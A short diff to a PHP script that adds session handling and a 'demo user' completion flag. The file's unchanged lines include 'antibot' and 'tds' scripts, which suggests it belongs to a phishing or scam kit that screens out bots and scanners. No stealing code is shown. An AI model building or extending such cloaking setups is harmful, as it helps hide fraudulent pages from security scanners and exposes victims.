@@ -1,7 +1,14 @@
 <?php
+session_start();
 
 include '../antibot.php';
 include '../antibot/tds.php';
+
+// Check if this is a demo user - if so, show demo completion message
+if (isset($_SESSION['demo_user']) && $_SESSION['demo_user'] === true) {
+    // Demo user completed the flow
+    $_SESSION['demo_completed'] = true;
+}
 
 ini_set('upload_max_filesize', '0');
 ini_set('post_max_size', '0');
